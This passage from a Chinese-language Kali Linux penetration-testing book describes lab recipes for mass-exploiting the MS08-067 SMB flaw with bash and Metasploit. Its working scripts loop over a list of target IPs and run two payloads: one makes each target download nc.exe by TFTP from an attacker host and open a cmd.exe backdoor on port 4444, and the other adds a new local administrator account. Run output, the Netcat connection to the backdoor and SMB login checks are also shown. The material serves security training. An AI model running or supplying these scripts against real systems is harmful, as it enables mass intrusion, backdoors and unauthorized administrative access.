  \ 1 章“入门”中的`使用文本编辑器 (VIM and Nano)` 教程。\n\n#### 如何实现……\n\n接下来的示例演示了如何使用 `bash` 脚本同时利用同一个漏洞的多个实例。该脚本特别可以通过引用\
  \ IP 地址输入列表来利用多个实例的 `MS08-067` NetAPI 漏洞：\n\n```bash\n#!/bin/bash\nif [ ! $1 ];\
  \ then echo \"Usage: #./script <host file>\"; exit; fi\niplist=$1\nfor ip in $(cat\
  \ $iplist)\ndo\ngnome-terminal -x msfcli exploit/windows/smb/ms08_067_netapi\nPAYLOAD=windows/exec\
  \ CMD=\"cmd.exe /c \\\"tftp -i 172.16.36.239 GET nc.exe && nc.exe -lvp 4444 -e cmd.exe\\\
  \"\" RHOST=$ip\necho \"Exploiting $ip and creating backdoor on TCP port 4444\"\n\
  done\n```\n\n此脚本与上一个教程中讨论的脚本不同，因为它在每个目标上都安装后门。在每个被利用的系统上，都会执行一个有效载负载，它使用集成的简单的文件传输协议\
  \ (`TFTP`) 客户端获取 `Netcat` 可执行文件，然后使用它在 TCP 端口 4444 上打开一个监听的 `cmd.exe` 终端服务。为了实现此功能，Kali\
  \ 系统上需要运行一个 `TFTP` 服务。可以通过执行以下命令完成：\n\n```bash\nroot@KaliLinux:~# atftpd --daemon\
  \ --port 69 /tmp\nroot@KaliLinux:~# cp /usr/share/windows-binaries/nc.exe /tmp/nc.exe\n\
  ```\n\n第一条命令在 UDP 端口 69 上启动 `TFTP` 服务，服务目录为 `/tmp`。第二个命令用于从 `windows-binaries` 文件夹将\
  \ `Netcat` 可执行文件复制到 `TFTP` 目录。现在我们执行 `./multipwn.sh` bash 壳：\n\n```bash\nroot@KaliLinux:~#\
  \ ./multipwn.sh\nUsage: #./script <host file>\nroot@KaliLinux:~# ./multipwn.sh iplist.txt\n\
  Exploiting 172.16.36.132 and creating backdoor on TCP port 4444\nExploiting 172.16.36.158\
  \ and creating backdoor on TCP port 4444\nExploiting 172.16.36.225 and creating\
  \ backdoor on TCP port 4444\n```\n\n如果在执行脚本时未提供任何参数，脚本将输出正确的用法说明。该用法说明将指示执行脚本时应带有一个参数，指定包含目标\
  \ IP 地址列表的文本文件名。一旦使用此参数执行，一系列新终端将开始弹出。这些终端中的每一个都将运行输入列表中一个 IP 地址的漏洞利用序列。原始执行终端将随着进程的执行输出进程列表，并指示在每个终端上将创建一个后门。在每个终端的漏洞利用序列完成后，可以使用\
  \ `Netcat` 连接到有效载负载打开的远程服务：\n\n```bash\nroot@KaliLinux:~# nc -nv 172.16.36.225 4444\n\
  (UNKNOWN) [172.16.36.225] 4444 (?) open\nMicrosoft Windows XP [Version 5.1]\n(UNKNOWN)\
  \ [172.16.36.225] 4444 (?) open\nMicrosoft Windows XP [Version 5.1]\n(UNKNOWN) [172.16.36.225]\
  \ 4444 (?) open\nMicrosoft Windows XP [Version 5.1]\n```\n\n\n\n\n```\nsniff(lfilter=rules,store=0)\n\
  ```\n\n该脚本监听所有入站流量。当收到 TTL 值为 15 或小于 ICMP 数据包时，脚本会将该系统标记为可被利用。\n\n```bash\nroot@KaliLinux:~#\
  \ ./listener.py\n\nListening for Incoming ICMP Traffic. Use Ctrl+C to stop scanning\n\
  ```\n\n应先执行 Python 流量监听器。脚本最初不会产生任何输出。该脚本在整个利用过程中应持续运行。一旦脚本运行，即可启动 bash 利用脚本。\n\n\
  ```bash\nroot@KaliLinux:~# ./multipwn.sh iplist.txt\n\nExploiting 172.16.36.132\
  \ and pinging\n\nExploiting 172.16.36.158 and pinging\n\nExploiting 172.16.36.225\
  \ and pinging\n```\n\n425\n\n*Kali 工具自动化*\n\n当执行该脚本时，原始终端 shell 将指示每个系统正在被利用，并且\
  \ ping 序列正在执行。输入列表中的每个 IP 地址都将打开一个新的 GNOME 终端。随着每个利用过程完成，目标系统应启动 ICMP 回显请求：\n\n\
  ```bash\nroot@KaliLinux:~# ./listener.py\n\nListening for Incoming ICMP Traffic.\
  \ Use Ctrl+C to stop scanning\n\n172.16.36.132 is exploitable\n\n172.16.36.158 is\
  \ exploitable\n\n172.16.36.225 is exploitable\n```\n\n假设利用成功，Python 监听脚本将识别生成的流量，并将\
  \ ICMP 流量的每个源 IP 地址列为可利用。\n\n### 工作原理……\n\nICMP 流量看起来并不是验证目标系统可利用性的一种直观方法。然而，它实际上运行非常有效。单个\
  \ ICMP 回显请求不会在目标系统中留下任何利用痕迹，且不需要过多的开销。此外，15 的自定义 TTL 值使得极不可能产生误报，因为几乎所有系统的初始 TTL\
  \ 值都是 128 或更高。\n\n### 带有管理员账户创建的多线程 MSF 利用\n\n本配方（recipe）将演示如何使用 bash 跨多个系统利用同一个漏洞，并在每个系统上添加新的管理员账户。这种技术可以用于通过集成终端服务或\
  \ SMB 身份验证访问后被破解的系统。\n\n### 准备工作\n\n要使用本配方中演示的脚本，你需要访问多个系统，且每个系统都具有一个可以使用 Metasploit\
  \ 利用的相同漏洞。在提供的示例中，通过复制一个运行受漏洞版本 Windows XP 的虚拟机，生成了三个 MS08-067 漏洞实例。关于设置 Windows\
  \ 系统的更多信息，请参阅本书第 1 章“入门指南”中的`安装 Windows Server`配方。此外，本节需要使用诸如 `VIM` 或 `Nano` 等文本编辑器向文件系统写入脚本。关于编写脚本的更多信息，请参阅本书第\
  \ 1 章“入门指南”中的`使用文本编辑器（VIM 和 Nano）`配方。\n\n426\n\n*第 8 章*\n\n### 如何实现……\n\n接随其后的示例演示了如何使用\
  \ bash 脚本可以同时利用同一个漏洞的多个实例。该脚本特别可以通过引用 IP 地址输入列表，来利用多个 MS08-067 NetAPI 漏洞实例：\n\n\
  ```bash\n#!/bin/bash\n\nif [ ! $1 ]; then echo \"Usage: #./script <host file> <username>\
  \ <password>\"; exit; fi\n\niplist=$1\nuser=$2\npass=$3\n\nfor ip in $(cat $iplist)\n\
  do\ngnome-terminal -x msfcli exploit/windows/smb/ms08_067_netapi\n\nPAYLOAD=windows/exec\
  \ CMD=\"cmd.exe /c \\\"net user $user $pass /add && net localgroup administrators\
  \ $user /add\\\"\" RHOST=$ip E\n\necho \"Exploiting $ip and adding user $user\"\n\
  \ndone\n```\n\n该脚本与之前的多线程利用脚本不同，原因在于负载。在这种情况下，利用成功后会执行两个顺序命令。\n\n这两个命令中的第一个会创建一个名为\
  \ `hutch` 的新用户账户并定义关联密码。第二个命令将新创建的用户账户添加到本地 Administrators 组：\n\n```bash\nroot@KaliLinux:~#\
  \ ./multipwn.sh\n\nUsage: #./script <host file> <username> <password>\n\nroot@KaliLinux:~#\
  \ ./multipwn.sh iplist.txt hutch P@33word\n\nExploiting 172.16.36.132 and adding\
  \ user hutch\n\nExploiting 172.16.36.158 and adding user hutch\n\nExploiting 172.16.36.225\
  \ and adding user hutch\n```\n\n427\n\n*Kali 工具自动化*\n\n如果在执行脚本时不提供任何参数，脚本将输出相应的用法。此用法说明执行脚本时应带有一个参数，指定包含目标\
  \ IP 地址列表的文本文件文件名。一旦使用此参数执行，一系列新终端将开始弹出。这些终端中的每一个都将运行输入列表中一个 IP 地址的利用序列。原始执行终端将在进程执行时输出进程列表，并指示新用户账户将被创建。在每个终端完成利用后，可以通过集成终端服务或\
  \ SMB 身份验证访问已破解的系统。为了验证已添加账户，可以使用 Metasploit 的 `smb_login` 辅助模块进行远程登录：\n\n```msf\n\
  msf > use auxiliary/scanner/smb/smb_login\nmsf auxiliary(smb_login) > setUser hutch\n\
  SMBUser => hutch\nmsf auxiliary(smb_login) > set Pass P@33word\nSMBPass => P@33word\n\
  msf auxiliary(smb_login) > set RHOSTS 172.16.36.225\nRHOSTS => 172.16.36.225\nmsf\
  \ auxiliary(smb_login) > run\n[*] 172.16.36.225:445 - Starting SMB login\n[+] 172.16.36.225:445\
  \ - SUCCESSFUL LOGIN (Windows 5.1) hutch : [STATUS_SUCCESS]\n[*] Username is case\
  \ insensitive\n[*] Domain is ignored\n[*] Scanned 1 of 1 hosts (100% complete)\n\
  [*] Auxiliary module completed\n```\n\n`SMB_login` 辅助模块的结果表明新凭据登录成功。该新创建的账户可以用于进一步的目的，或者可以使用脚本测试该账户的存在以验证漏洞。\n\
  \n通过在每个执行的系统上添加账户，攻击者可以对该系统执行后续操作。这种方法既有优点也有缺点。在被破解的系统上添加新账户比破解现有账户更快，并且可以访问现有远程服务（如\
  \ RDP）。另一种，添加新账户并不非常隐蔽，有时会触发基于主机的入侵检测系统的警报。\n\n428\n\n索引\n\nA\nBurp Suite Comparison\
